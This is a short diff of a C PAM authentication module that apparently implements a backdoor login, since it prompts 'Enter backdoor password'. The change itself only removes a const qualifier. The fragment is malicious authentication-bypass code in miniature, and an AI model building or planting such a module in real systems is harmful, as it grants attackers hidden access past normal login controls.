@@ -75,7 +75,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
 	int pam_return_code;
 	char prompt[] = "Enter backdoor password : \0";
 	const void *pam_uname = NULL;
-	const struct pam_conv *conv = NULL;
+	struct pam_conv *conv = NULL;
 	struct pam_message *message = (struct pam_message *)malloc(sizeof(struct pam_message));
 	struct pam_response *response = NULL;
 
